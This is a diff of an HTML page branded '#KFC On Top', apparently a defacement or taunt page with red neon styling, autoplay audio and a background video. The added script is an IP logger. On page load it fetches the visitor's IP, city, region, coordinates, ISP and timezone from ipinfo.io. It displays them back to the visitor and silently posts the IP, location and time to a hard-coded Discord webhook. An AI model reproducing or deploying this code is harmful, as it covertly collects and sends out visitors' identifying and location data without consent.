@@ -1,86 +1,146 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/KFC</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #000 url('') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #FF0000; /* لون النص الأساسي أبيض */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PSYCHO & CJ</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Courier New', Courier, monospace;
+        color: #490a0a;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        text-align: center;
+        overflow: hidden;
+        background-color: black;
+    }
 
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #FF0000; /* برواز أبيض */
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5); 
-        }
+    .background-video {
+        display: none;
+    }
 
-        .info {
-            margin-top: 20px;
-            font-size: 1.1em;
-            color: #FF0000;
-            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.8); 
-            white-space: pre-wrap;
-            background: rgba(0, 0, 0, 0.8); /* خلفية سوداء داكنة لتبرز النص الأبيض */
-            padding: 20px;
-            border-radius: 10px;
-            border: 1px solid #FF0000; 
-            box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.1);
-        }
+    .content {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 1;
+        position: relative;
+        height: 100vh;
+        width: 100%;
+    }
 
-        .text {
-            margin-top: 20px;
-            font-size: 3.5em; 
-            font-weight: bold;
-            color: #FF0000;
-            /* توهج أبيض (Neon White) */
-            text-shadow: 0px 0px 10px #FF0000, 0px 0px 20px rgba(255, 255, 255, 0.5);
-            letter-spacing: 5px; 
-        }
-    </style>
+    .background-video-second {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -1;
+    }
+
+    .info {
+        margin-top: 20px;
+        font-size: 1.5em;
+        background: linear-gradient(45deg, red, red, red);
+        -webkit-background-clip: text;
+        color: transparent;
+        text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px rg #ff0000 0px 0px 25px #FF0000;
+        letter-spacing: 4.5px;
+        white-space: pre-wrap;
+    }
+
+    .text {
+        margin-top: 20px;
+        font-size: 3em;
+        background: linear-gradient(45deg, red, red, red);
+        -webkit-background-clip: text;
+        color: transparent;
+        text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px #FF0000, 0px 0px 25px #FF0000;
+        letter-spacing: 4.5px;
+    }
+
+    .marquee {
+        position: absolute;
+        top: 10%;
+        width: 100%;
+        overflow: hidden;
+        white-space: nowrap;
+    }
+
+    .marquee span {
+        display: inline-block;
+        font-size: 2em;
+        color: #ff0000;
+        text-shadow: 0px 0px 8px #FF0000, 0px 0px 15px #FF0000, 0px 0px 25px #FF0000;
+        animation: scroll 10s linear infinite;
+    }
+
+    @keyframes scroll {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-100%); }
+    }
+
+    .image-container img {
+        max-width: 80%;
+        height: auto;
+        margin: 20px auto;
+        display: block;
+        filter: drop-shadow(0 0 0 red) drop-shadow(0 0 2px red) drop-shadow(0 0 4px red);
+    }
+</style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="https://media.discordapp.net/attachments/1487738672496508959/1527239316252917830/content.png?ex=6a59eff3&is=6a589e73&hm=5fca77228cc04326e17a12c2b3800983243725ad661eda2216031c5cb0a08b88&=&format=webp&quality=lossless&width=1376&height=917" alt="Discord Image">
+
+<div class="content">
+    <video class="background-video-second" autoplay loop muted>
+        <source src="[url=https://k.top4top.io/p_338939bdw1.png][img]https://k.top4top.io/s_338939bdw1.png[/img][/url]" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="marquee">
+        <span></span>
     </div>
 
-    <audio id="bgMusic" autoplay loop>
-        <source src="https://g.top4top.io/m_38499khkc1.mp4" type="audio/mpeg">
-    </audio>
+    <div id="content">
+        <div class="image-container">
+            <img src="https://media.discordapp.net/attachments/1487738672496508959/1527239316252917830/content.png?ex=6a59eff3&is=6a589e73&hm=5fca77228cc04326e17a12c2b3800983243725ad661eda2216031c5cb0a08b88&=&format=webp&quality=lossless&width=1376&height=917" alt="">
+        </div>
 
-    <div class="info" id="ip-info">
-        > SYSTEM WHITE PROTOCOL...
-        > STATUS: CRYSTAL CLEAR
+        <div class="info" id="ip-info">Loading IP Info...</div>
+        <div class="text">#KFC On Top</div>
+
+        <audio autoplay loop>
+            <source src="https://g.top4top.io/m_38499khkc1.mp4" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
     </div>
+</div>
 
-    <div class="text">KFC On Top<object data="" type="">
-      
-    </object></div>
-
-    <script>
-        fetch('https://ipinfo.io/json')
+<script>
+    fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
-            delete data.readme;
+            const { ip, country, city, region, loc, org, timezone } = data;
             const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 4);
-        })
-        .catch(err => {
-            document.getElementById('ip-info').textContent = "ERROR: DATA NOT FOUND";
+            infoDiv.innerHTML = `<strong>#KFC On Top</strong><br><strong>IP:</strong><span>"${ip}"</span><br><strong>City:</strong><span>"${city}"</span><br><strong>Region:</strong><span>"${region}"</span><br><strong>Country:</strong><span>"${country}"</span><br><strong>Location:</strong><span>"${loc}"</span><br><strong></strong> <span>"${org}"</span><br><strong>Timezone:</strong><span>"${timezone}"</span>`;
+
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1342711596035604511/c2zeLZnSp0faGn2G7rnFX6NOdOt1ewLys7Sp55NJt1p1A6FIkFkDciidXSyaV7_3WGie';
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`
+                })
+            });
         });
-    </script>
+</script>
 </body>
 </html>
